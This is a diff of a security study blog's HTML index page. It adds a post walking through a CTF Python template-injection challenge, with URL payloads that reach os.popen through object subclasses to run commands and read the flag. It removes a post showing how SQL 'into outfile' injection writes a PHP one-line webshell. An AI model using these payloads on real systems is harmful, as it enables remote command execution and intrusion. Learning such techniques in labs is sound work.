@@ -71,6 +71,55 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-模板注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/30/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time class="dt-published" datetime="2022-04-30T11:49:11.815Z" itemprop="datePublished">2022-04-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/04/30/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">模板注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>关于模板的一些知识：<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a></p>
+<p>python模板注入：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Mr_helloword/article/details/107949217?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165131865116782425172599%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=165131865116782425172599&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-107949217.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Econtrol&amp;utm_term=Web_python_template_injection&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/Mr_helloword/article/details/107949217?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165131865116782425172599%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=165131865116782425172599&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-107949217.142^v9^pc_search_result_cache,157^v4^control&amp;utm_term=Web_python_template_injection&amp;spm=1018.2226.3001.4187</a></p>
+<p>通过python的对象的继承来一步步实现文件读取和命令执行的的。</p>
+<p>也就是找到父类&lt;type ‘object’&gt;–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块。</p>
+<p>几个魔术方法</p>
+<p>class 返回类型所属的对象<br>mro 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br>base 返回该对象所继承的基类 &#x2F;&#x2F; __base__和__mro__都是用来寻找基类的</p>
+<p>subclasses 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br>init 类的初始化方法<br>globals 对包含函数全局变量的字典的引用<br>————————————<br>python模块注入题解<br>1.查看页面，根据提示，随便在url后添加字符，<a target="_blank" rel="noopener" href="http://192.168.100.161:62264/38">http://192.168.100.161:62264/38</a> ax,查看报错页面，可以发现显示ax，存在SSTI。<br>2.访问<a target="_blank" rel="noopener" href="http://192.168.100.161:62264/%7B%7B[].__class__.__base__.__subclasses__()%7D%7D,%E6%9D%A5%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E6%A8%A1%E5%9D%97">http://192.168.100.161:62264/%7B%7B[].__class__.__base__.__subclasses__()%7D%7D,来查看所有模块</a></p>
+<p>3.os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置，为第59个</p>
+<p>4.访问<a target="_blank" rel="noopener" href="http://192.168.100.161:62264/%7B%7B[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()%7D%7D,%E6%9F%A5%E7%9C%8Bcatch_warnings%E6%A8%A1%E5%9D%97%E9%83%BD%E5%AD%98%E5%9C%A8%E5%93%AA%E4%BA%9B%E5%85%A8%E5%B1%80%E5%87%BD%E6%95%B0%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%89%BE%E5%88%B0linecache%E5%87%BD%E6%95%B0%EF%BC%8Cos%E6%A8%A1%E5%9D%97%E5%B0%B1%E5%9C%A8%E5%85%B6%E4%B8%AD">http://192.168.100.161:62264/%7B%7B[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()%7D%7D,查看catch_warnings模块都存在哪些全局函数，可以找到linecache函数，os模块就在其中</a></p>
+<p>5.使用[‘o’+’s’],可绕过对os字符的过滤，访问<a target="_blank" rel="noopener" href="http://192.168.100.161:62264/%7B%7B().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(%22os%22).popen(%22ls%22).read()&#39;%20)%7D%7D%E6%9F%A5%E7%9C%8Bflag%E6%96%87%E4%BB%B6%E6%89%80%E5%9C%A8">http://192.168.100.161:62264/%7B%7B().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(%22os%22).popen(%22ls%22).read()&#39;%20)%7D%7D查看flag文件所在</a></p>
+<p>6.访问<a target="_blank" rel="noopener" href="http://192.168.100.161:62264/%7B%7B%22%22.__class__.__mro__[2].__subclasses__()[40](%22fl4g%22).read()%7D%7D,%E5%8F%AF%E5%BE%97%E5%88%B0flag%E3%80%82">http://192.168.100.161:62264/%7B%7B%22%22.__class__.__mro__[2].__subclasses__()[40](%22fl4g%22).read()%7D%7D,可得到flag。</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/30/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" data-id="cl2lu1u4d000038vj5zx56vdq" data-title="模板注入" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-反序列化漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/04/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
@@ -547,48 +596,11 @@ else
 
 
   
-    <article id="post-一句话木马补充" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/04/17/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E8%A1%A5%E5%85%85/" class="article-date">
-  <time class="dt-published" datetime="2022-04-17T06:04:38.590Z" itemprop="datePublished">2022-04-17</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <hr>
-<h2 id="title-一句话木马补充"><a href="#title-一句话木马补充" class="headerlink" title="title:一句话木马补充"></a>title:一句话木马补充</h2><p>多种方式写入文件，这里的一句话已经转换为十六进制<br><?php phpinfo();?>&#x3D;0x3c3f70687020706870696e666f28293b3f3e<br>换成常见的一句话就是’<?php @eval(post["mima"])?>‘</p>
-<ol>
-<li>union注入写文件</li>
-</ol>
-<p>SELECT * FROM user WHERE id &#x3D; -1 union select 1,2,0x3c3f70687020706870696e666f28293b3f3e into outfile ‘D:&#x2F;1.php’<br>2. FIELDS TERMINATED BY（可在limit等语句后）</p>
-<p>SELECT * FROM user WHERE id &#x3D; 1 into outfile ‘D:&#x2F;1.php’ fields terminated by 0x3c3f70687020706870696e666f28293b3f3e<br>3. LINES TERMINATED BY（可用于limit等sql注入）</p>
-<p>SELECT username FROM user WHERE id &#x3D; 1 into outfile ‘D:&#x2F;1.php’ LINES TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e<br>4. LINES STARTING BY（可用于limit等sql注入）</p>
-<p>SELECT username FROM user WHERE id &#x3D; 1 into outfile ‘D:&#x2F;2.php’ LINES STARTING  BY 0x3c3f70687020706870696e666f28293b3f3e</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/04/17/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E8%A1%A5%E5%85%85/" data-id="cl22vvyyq000jl4vj3lho27pa" data-title="" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -620,6 +632,10 @@ else
       <ul>
         
           <li>
+            <a href="/2022/04/30/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">模板注入</a>
+          </li>
+        
+          <li>
             <a href="/2022/04/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">(no title)</a>
           </li>
         
@@ -633,10 +649,6 @@ else
         
           <li>
             <a href="/2022/04/17/LESS%2032~37/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2022/04/17/less%2029~31/">(no title)</a>
           </li>
         
       </ul>
